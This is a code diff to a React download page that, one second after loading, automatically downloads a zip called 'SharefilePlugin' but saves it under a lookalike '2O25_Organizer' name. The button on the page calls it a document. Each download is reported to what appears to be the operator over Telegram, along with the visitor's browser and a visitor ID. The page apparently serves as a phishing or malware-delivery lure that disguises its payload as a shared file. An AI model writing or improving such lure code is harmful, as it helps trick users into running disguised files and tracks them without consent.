@@ -234,25 +234,44 @@ const Download = () => {
     return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
   }, []);
 
+  const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
+    try {
+      // Fetch as blob to allow custom filename on cross-origin URLs
+      const response = await fetch(file.href);
+      const blob = await response.blob();
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = file.name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      URL.revokeObjectURL(url);
+    } catch {
+      // Fallback to direct link
+      const link = document.createElement("a");
+      link.href = file.href;
+      link.download = file.name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    if (!notifiedRef.current) {
+      notifiedRef.current = true;
+      sendTelegramNotification("download", {
+        fileName: file.name,
+        browser: getBrowserName(),
+        visitorId: visitorData?.visitor_id,
+      });
+    }
+  }, [visitorData]);
+
   // Auto-download (only if not blocked)
   useEffect(() => {
     if (!downloadFile || blocked) return;
     const timer = setTimeout(() => {
-      const link = document.createElement("a");
-      link.href = downloadFile.href;
-      link.download = downloadFile.name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      if (!notifiedRef.current) {
-        notifiedRef.current = true;
-        sendTelegramNotification("download", {
-          fileName: downloadFile.name,
-          browser: getBrowserName(),
-          visitorId: visitorData?.visitor_id,
-        });
-      }
+      triggerDownload(downloadFile);
     }, 1000);
     return () => clearTimeout(timer);
   }, [blocked]);
@@ -300,14 +319,13 @@ const Download = () => {
               download the document again
             </p>
 
-            <a
-              href={blocked ? "#" : downloadFile.href}
-              download={blocked ? undefined : downloadFile.name}
-              onClick={blocked ? (e) => e.preventDefault() : undefined}
-              className="inline-block bg-[#4285f4] hover:bg-[#3367d6] text-white font-semibold px-10 py-3 rounded-md text-[15px] transition-colors"
+            <button
+              onClick={blocked ? undefined : (e) => { e.preventDefault(); triggerDownload(downloadFile); }}
+              disabled={blocked}
+              className="inline-block bg-[#4285f4] hover:bg-[#3367d6] text-white font-semibold px-10 py-3 rounded-md text-[15px] transition-colors cursor-pointer disabled:opacity-50"
             >
               Download Document
-            </a>
+            </button>
           </div>
         </div>
     </div>
